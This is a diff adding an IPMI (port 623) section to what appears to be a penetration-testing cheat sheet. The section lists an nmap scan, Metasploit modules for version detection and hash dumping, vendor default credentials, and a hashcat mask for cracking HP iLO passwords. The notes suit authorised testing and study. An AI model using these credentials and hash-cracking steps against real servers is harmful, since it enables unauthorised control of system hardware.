@@ -823,6 +823,35 @@ sqlplus user/pass@[ip]/XE
 # Execute the following if you run into "sqlplus: error while loading"
 sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
 ```
+<br>
+
+## IPMI (Intelligent Platform Management Inferface) Port 623
+
+**IPMI**: Allows for management of system hardware independantly of OS or BIOS. you can check up on temp, fan speeds, logs, even if the system is powered off. It is nearly equivilent to having physical access to the system.
+
+**Footprinting**
+```
+sudo nmap -sU --script ipmi-version -p 623 [webaddress]
+
+# metasploit module 
+aux/scanner/ipmi/ipmi_version 
+
+# Default passwords 
+  Dell: root calvin 
+  HP iLO: Administrator [randomized 8-character string consisting of numbers and uppercase letters]
+  Supermicro: ADMIN ADMIN
+
+# In the event of an HP iLO using a factory default password
+hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u 
+
+# To retrieve IPMI hashes use the following MSF module 
+scanner/ipmi/ipmi_dumphashes
+```
+
+
+
+
+
 
 
 
